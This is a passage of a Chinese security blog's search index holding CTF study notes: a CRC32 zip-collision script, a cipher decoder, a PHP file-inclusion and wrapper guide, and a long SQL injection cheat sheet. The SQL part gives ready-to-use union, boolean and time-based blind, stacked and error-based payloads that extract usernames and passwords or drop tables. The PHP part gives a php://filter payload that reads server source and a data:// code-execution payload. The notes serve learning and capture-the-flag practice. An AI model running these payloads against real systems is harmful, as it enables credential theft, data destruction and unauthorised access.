#获取任意4Byte字符串的CRC32值                        calc_crc = thicken_crc & 0xffffffff  #将任意4Byte字符串的CRC32值与0xffffffff进⾏与运算                        if calc_crc == crc_value:  #匹配两个CRC32值                           print(&#x27;[Success] &#123;&#125;:&#123;&#125;&#x27;.format(hex(crc_value),res_char))                           comment += res_char    print(&#x27;+-----------------CRC碰撞结束！！！-----------------+&#x27;)    crc32_list = str(crc32_list)    crc32_list = crc32_list.replace(&#x27;\&#x27;&#x27;, &#x27;&#x27;)    print("读取成功，导出CRC列表为：" + crc32_list)                     #导出CRC列表    if comment:         print(&#x27;CRC碰撞成功，结果为: &#123;&#125;&#x27;.format(comment))                  #输出CRC碰撞结果    else:         print(&#x27;CRC碰撞没有结果，请检查压缩包内⽂件是否为4Byte！！！&#x27;)if __name__ == &#x27;__main__&#x27;:    zipname = str(input("请输⼊压缩包名字：\n4Byte >> > "))    try:        if zipname:           FileRead(zipname)           FourByte(zipname)    except BaseException as e:        err = str(e)        print(&#x27;脚本详细报错：&#x27; + err)</code></pre><p>15.云影密码</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">a="884080810882108108821042084010421"   #输入s=a.split(&#x27;0&#x27;)print(s)l=[]for i in s:    sum=0    for j in i:        sum+=eval(j)    l.append(chr(sum+64))print(&#x27;&#x27;.join(l))</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2025/03/25/php-wei-xie-yi/"/>
      <url>/2025/03/25/php-wei-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验<strong>被绕过</strong>，就会导致文件包含漏洞。</p><h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容<strong>不符合</strong> php 语法，会直接将文件内容输出。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀<strong>不能</strong>与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p><pre class=" language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal"><code class="language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal">on</span>（是否允许 include/require 远程文件）<span class="attr">allow_url_fopen</span> = <span class="literal">on</span>（是否允许打开远程文件）</code></pre><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>压缩流</td></tr></tbody></table><pre class=" language-highlight bash"><code class="language-highlight bash">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，convert.base64-encode是一种过滤器，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p><h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p><pre class=" language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in"><code class="language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in">xxxx</span>(base64编码后的数据)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/01/29/sql/"/>
      <url>/2025/01/29/sql/</url>
      
        <content type="html"><![CDATA[<h2 id="一、判断注入类型"><a href="#一、判断注入类型" class="headerlink" title="一、判断注入类型"></a>一、判断注入类型</h2><h3 id="按照注入点类型分类"><a href="#按照注入点类型分类" class="headerlink" title="按照注入点类型分类"></a>按照注入点类型分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>​        SQL中的语句格式：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =x</code></pre><pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断    当输入：and 1=1 时页面显示正常                   select * from users where id =x and 1=1        输入：and 1=2 时页面显示异常                   select * from users where id =x and 1=2       说明是数字型注入</code></pre><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>​        SQL中的语句格式：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =&#x27;x&#x27;</code></pre><pre><code>    判断方法：使用 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2 来判断    当输入：1’ and ‘1’=&#39;1 时页面显示正常                   select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;1&#39;       输入：1’ and ‘1’=&#39;2 时页面显示异常                  select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;2&#39;      说明是字符型注入</code></pre><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>​        基于搜索框的注入</p><p>​    SQL中的语句格式：select * from database.table where users like ‘%要查询的关键字%’</p><p>   判断方法：</p><p>​     某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre><p>​    页面显示正常</p><p>​     某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre><p>​    页面显示异常</p><p>​    根据上面的返回情况来判断是否存在搜索型注入</p><h2 id="二、联合注入"><a href="#二、联合注入" class="headerlink" title="二、联合注入"></a>二、联合注入</h2><h6 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h6><p>​        语句：1’ or 1 &#x3D; 1#    (这条万能语句常用于登录框之类的注入)</p><p>​    作用：是爆出表中的所有字段</p><p>​    举例：验证用户名和密码的语句</p><p>​    【在地址栏中的注释符可以用：–+】</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;";</code></pre><p>​    当存在SQL注入，我们在密码出输入 1’ or 1 &#x3D; 1# 后，整条语句变成</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;";</code></pre><p>​    # 是注释符号，后面的内容被注释掉，or 是或，作用两边有一边为真，结果就为真，因为右边的 1&#x3D;1 为真，所以上述语句等价于</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where username=&#x27;1&#x27; or 1 = 1</code></pre><p>​    即使用户名不存在也没关系，1&#x3D;1 为 true，等价于</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users</code></pre><p>​    所以该语句的作用是爆破出所有字段</p><h6 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h6><p>​    </p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">语句：1&#x27;  order by 数值#</code></pre><h6 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h6><p>order by 判断字段数的目的就是为这一步做准备，如果只有 2 个字段，那union select 1,2# 才是正确的，写成 union select 1,2,3# 就错了，字段数只有两个没有三个</p><pre><code>    语句：-1’ union select 1,2,3#</code></pre><h6 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h6><p>​        关键：database()</p><pre><code>    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2）    语句：-1&#39; union select 1,database(),3#</code></pre><h6 id="爆破表格名"><a href="#爆破表格名" class="headerlink" title="爆破表格名"></a>爆破表格名</h6><p>​        </p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><pre><code>    和爆破数据库名一样的思路    语句：-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#</code></pre><p>【注意：如果 information_schema 被过滤了，可以使用 sys】</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1&&substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</code></pre><h6 id="爆破表格字段"><a href="#爆破表格字段" class="headerlink" title="爆破表格字段"></a>爆破表格字段</h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;</code></pre><pre><code>    语句：-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表格名&#39;,3#</code></pre><h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id><a href="#" class="headerlink" title></a></h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(id,username,password) from geekuser</code></pre><pre><code>    语句：-1&#39; union select 1,group_concat(id,username,password) from geekuser,3#</code></pre><p>(以上所用到的语句都属于联合注入，union select 开头的语句属于联合注入，这种注入有个前提条件，页面必须有回显位，如果页面没有回显位那就要考虑盲注，可直接在目录找到盲注相关内容)</p><h2 id="四、盲注"><a href="#四、盲注" class="headerlink" title="四、盲注"></a>四、盲注</h2><p>概念：在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试（说白了就是猜测内容），这个过程成为盲注</p><p>注意：盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li><strong>使用场景：</strong>无论我们输入的语句是否合法，页面的显示信息是<strong>固定</strong>的，即不会出现查询的信息，也不会出现报错信息。</li></ul><p>（可以尝试基于<strong>时间盲注</strong>来测试，根据<strong>页面响应的时间</strong>，来判断输入的信息是否正确）</p><ul><li><strong>本质：</strong>利用插入的sql语句执行造成时间延迟</li></ul><h5 id="第一步：判断参数构造"><a href="#第一步：判断参数构造" class="headerlink" title="第一步：判断参数构造"></a>第一步：判断参数构造</h5><blockquote><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(6),1)–+</p></blockquote><p>如果 1&#x3D;1 成立，延迟 6 秒才访问成功</p><p>这里会一直加载中，知道达到 6 s，如果 条件不成立（比如：1 &#x3D; 2），那就会直接访问成功，不会转（当然了，实战时要确保网络正常，不然可能会出现误判）</p><h5 id="第二步：判断数据名长度"><a href="#第二步：判断数据名长度" class="headerlink" title="第二步：判断数据名长度"></a>第二步：判断数据名长度</h5><blockquote><p>?id&#x3D;1’and if(length((select database()))&#x3D;8,sleep(6),1)–+</p></blockquote><p>解释：如果数据库长度为 8 ，则条件成立，延迟 6 s，否则不延迟，这个数字需要大家自己慢慢去试</p><h5 id="第三步：爆破数据库名"><a href="#第三步：爆破数据库名" class="headerlink" title="第三步：爆破数据库名"></a>第三步：爆破数据库名</h5><p>方法一：</p><blockquote><p>?id&#x3D;1’ and if(ascii(substr((select <strong>database()</strong>),1,1))&#x3D;115,sleep(6),1)–+</p></blockquote><p>方法二：</p><blockquote><p>?id&#x3D;1’ and if(left(<strong>database()</strong>,1)&#x3D;’s’,sleep(6),1)–+</p></blockquote><h5 id="第四步：判断数据库表名长度"><a href="#第四步：判断数据库表名长度" class="headerlink" title="第四步：判断数据库表名长度"></a>第四步：判断数据库表名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(6),1)--+</code></pre><h5 id="第五步：爆破数据库表名"><a href="#第五步：爆破数据库表名" class="headerlink" title="第五步：爆破数据库表名"></a>第五步：爆破数据库表名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(6),1)--+</code></pre><p>刚开始判断的时候可以 &gt;97、&gt;99这样去快速逼近正确值，最后再用等号去确定</p><h5 id="第六步：爆破所有字段名长度"><a href="#第六步：爆破所有字段名长度" class="headerlink" title="第六步：爆破所有字段名长度"></a>第六步：爆破所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))>20,sleep(6),1)--+</code></pre><p>这里的 users 是通过前面的爆破数据库表名爆破出来的，那一步没过，是到不了这一步的，只有确定了账号密码等信息在哪个表，哪个字段才行</p><h5 id="第七步：爆破字段名"><a href="#第七步：爆破字段名" class="headerlink" title="第七步：爆破字段名"></a>第七步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99,sleep(6),1)--+</code></pre><h5 id="第八步：判断字段内容长度"><a href="#第八步：判断字段内容长度" class="headerlink" title="第八步：判断字段内容长度"></a>第八步：判断字段内容长度</h5><p>假设得出存在 username、password等字段，那账号密码等数据大概率保存在这里面</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(length((select group_concat(username,password) from users))>109,sleep(6),1)--+</code></pre><h5 id="第九步：爆破字段内容"><a href="#第九步：爆破字段内容" class="headerlink" title="第九步：爆破字段内容"></a>第九步：爆破字段内容</h5><p>方法一：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))=68,sleep(6),1)--+</code></pre><p>十进制 68 对应的 ASCII 字符是 D</p><p>方法二：</p><p>个人感觉方法二更快，方法一还得去 ASCII 表对着找</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</code></pre><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p><p>布尔盲注主要用到 <strong>length()<strong>、</strong>ascii()<strong>、</strong>substr()</strong> 这三个函数</p><p><strong>步骤：</strong></p><blockquote><p>1、先判断长度</p><p>2、在判断字符</p></blockquote><h5 id="第一步：判断数据库名长度"><a href="#第一步：判断数据库名长度" class="headerlink" title="第一步：判断数据库名长度"></a><strong>第一步：</strong>判断数据库名长度</h5><p>判断数据库名长度：</p><blockquote><p>?id&#x3D;1’ and length((select database()))&#x3D;8–+</p></blockquote><p>注意：1后面的 ‘ 是需要判断的，也有可能是 “ ，也可能是 ‘)、”) 这是语句里面的闭合符合，也可以是 &gt;8、&lt;8 之类的</p><p>若是在输入框中，and 要改成 or</p><h5 id="第二步：爆破数据库名"><a href="#第二步：爆破数据库名" class="headerlink" title="第二步：爆破数据库名"></a>第二步：爆破数据库名</h5><p>一个一个字符对着 ASCII 匹配，不难但是很耗时</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+</code></pre><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">substr("788888",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注因为要判断每一个字符，所以长度为一，后面就改变读取位置就可以了</code></pre><p>另一种方法：left()**</p><blockquote><p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+  （判断第一个字符是不是 s）</p></blockquote><h5 id="第三步：判断数据库表长度"><a href="#第三步：判断数据库表长度" class="headerlink" title="第三步：判断数据库表长度"></a>第三步：判断数据库表长度</h5><p>判断数据库表长度：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+</code></pre><p>上面那条语句的意思是判断所有数据库表名的长度</p><h5 id="第四步：爆破表名"><a href="#第四步：爆破表名" class="headerlink" title="第四步：爆破表名"></a>第四步：爆破表名</h5><p>一个一个字符爆破表名</p><p>方法一：匹配字符</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+</code></pre><p>和上面一样，一个一个试，或者用脚本</p><p>方法二：直接匹配名字</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 2,1)=&#x27;uagents&#x27;--+</code></pre><h5 id="第五步：判断所有字段名长度"><a href="#第五步：判断所有字段名长度" class="headerlink" title="第五步：判断所有字段名长度"></a>第五步：判断所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))=20--+</code></pre><h5 id="第六步：爆破字段名"><a href="#第六步：爆破字段名" class="headerlink" title="第六步：爆破字段名"></a>第六步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99--+</code></pre><p>同样也可以直接匹配名字：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1)=&#x27;username&#x27;--+</code></pre><p>最后匹配发现有：username、password （这两个是比较关键的）</p><h5 id="第七步：判断所有字段内容长度"><a href="#第七步：判断所有字段内容长度" class="headerlink" title="第七步：判断所有字段内容长度"></a>第七步：判断所有字段内容长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(username,password) from users))>109--+</code></pre><h5 id="第八步：爆破字段值（匹配账号密码）"><a href="#第八步：爆破字段值（匹配账号密码）" class="headerlink" title="第八步：爆破字段值（匹配账号密码）"></a>第八步：爆破字段值（匹配账号密码）</h5><p>方法一：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))>50--+</code></pre><p>方法二：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select username from users where id=1)=&#x27;dumb&#x27;--+</code></pre><h2 id="五、堆叠注入"><a href="#五、堆叠注入" class="headerlink" title="五、堆叠注入"></a>五、堆叠注入</h2><p>概念：堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号 ; 用来表示一条 sql 语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入，攻击就是利用此特点，在第二条语句中构造payload。</p><p>原理：很简单，mysql_multi_query() 支持多条sql语句同时执行</p><p>防范方法：使用 mysqli_ query() 函数，其只能执行一条语句，分号后面的内容将不会被执行；过滤特殊符</p><p>号 “ ; ”。</p><p>堆叠注入优点：联合查询 union 也可拼接语句（有局限性），但是堆叠注入能注入任意语句</p><p>当然了，堆叠注入的条件比较苛刻，可能受到API或者数据库引擎不支持的限制</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">未对 ";" 号进行过滤；未禁止执行多条sql语句</code></pre><p>举例一：</p><p>新建表，表名：test</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;create table test like users;</code></pre><p>删除表，表名：test</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;drop table test;</code></pre><p>……还有很多，可以自行搜索</p><h6 id="表结构："><a href="#表结构：" class="headerlink" title="表结构："></a>表结构：</h6><p>​        表结构就是定义数据表文件名，确定数据表包含哪些字段，各字段的字段名、字段类型、及宽度，并将这些数据输入到计算机当中。</p><pre><code>    查看字段值：            1&#39;;select 字段名 from `纯数字表名`;            1&#39;;select 字段名 from 非纯数字表名;</code></pre><h2 id="六、二次注入"><a href="#六、二次注入" class="headerlink" title="六、二次注入"></a>六、二次注入</h2><p>概念：</p><pre><code>    二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是 SQL 注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</code></pre><p>原理：</p><pre><code>    在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但是addslashes 有一个特点就是虽然参数在过滤后会添加  “\”  进行转义，但是 “\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。数据中一般带有单引号和 ＃ 号，然后下次使用在拼凑 SQL 中。</code></pre><p>二次注入没有什么命令需要去记住，适合用于获取管理员登录权限的思路七、报错注入</p><h3 id="七、报错注入"><a href="#七、报错注入" class="headerlink" title="七、报错注入"></a>七、报错注入</h3><p><strong>使用场景：</strong>在联合查询无法实现的情况下可以尝试使用报错注入，比如说 <strong>union</strong> 被过滤</p><p><strong>理解</strong>：一般指页面没有回显，但是SQL语句执行可以输出<strong>错误信息</strong>的情况。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>相关函数：</p><p><strong>extractvalue (XML_document, XPath_string)</strong></p><p>​    第一个参数：XML_document 是目标XML文档<br>​    第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内   容，报错注入正是利用这一点<br><strong>updatexml (XML_document, XPath_string, new_value)</strong></p><p>第一个参数：XML_document 是目标XML文档<br>第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，     报错注入正 是利用这一点<br>第三个参数：new_value 用来替换查找到的符合条件的数据<br>例如： 1’ or updatexml(1,concat(‘#’,database()),1)#，由于 # 不属于xpath语法格式，因此报出xpath语法错误。</p><p>①、extractvalue报错注入<br>❤ 爆破数据库名</p><p>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#</p><p>❤ 爆破表格名</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#</p><p>❤ 爆破字段名</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表格名’),0x5c)))#</p><p>❤ 爆破字段值</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from 表格名),0x5c)))#</p><p>注意：</p><p>若是对于修改密码页面则需要另一种方法爆破对应用户密码</p><p>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’想要爆破的用户名’) b) ,0x5c)))#</p><p>②、updatexml报错注入<br>❤ 爆破数据库名</p><p>1’ or updatexml(1,concat(‘#’,database()),1)#</p><p>❤ 爆破表格名</p><p>1’ or updatexml(1,concat(0x7e，select table_name from information_schema.tables where table_schema &#x3D; ‘数据库名’,0x7e),1)#</p><p>❤ 爆破表格字段</p><p>1’ or updatexml(1,concat(‘#’,select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表格名’),1)#</p><p>❤ 获取字段值</p><p>1’ or updatexml(1,concat(‘#’,select group_concat(id,username,password) from 表格名),1)#</p><p>❤爆破对应用户的密码</p><p>123’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;’用户名’) b),0x5c),1))#</p><p>③、group by报错注入<br>推荐一篇文章，便于理解 group by 报错注入，该注入方法比较复杂</p><p>深入理解group by报错注入-CSDN博客</p><p>❤爆破数据库</p><p>123’ and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#</p><p>❤爆破出所有数据库表格</p><p>1’ and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#</p><p>❤爆破字段名</p><p>1’ and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e,floor(rand(0)*2)))#</p><p>❤爆破字段值</p><p>1’ and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</p><p>❤爆破用户密码</p><p>1’ and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;’用户名’),0x7e,floor(rand(0)*2)))a)#</p><p>原文链接：<a href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p><p>SQL注入流程：</p><ol><li>是否存在注入并且判断注入类型</li><li>判断字段数 ‘ order by 数字 – ‘</li><li>确定回显点 -1 ‘ union select 1,2 – ‘</li><li>查询数据库信息 @@version @@datadir</li><li>查询用户名，数据库名 user() database()</li><li>查询表名 -1 ‘ union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’ – ‘</li><li>查询列名 -1 ‘ union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ – ‘</li><li>查询flag -1 ‘ union select 1,2, group_concat(flag所在的列名) from 表名</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
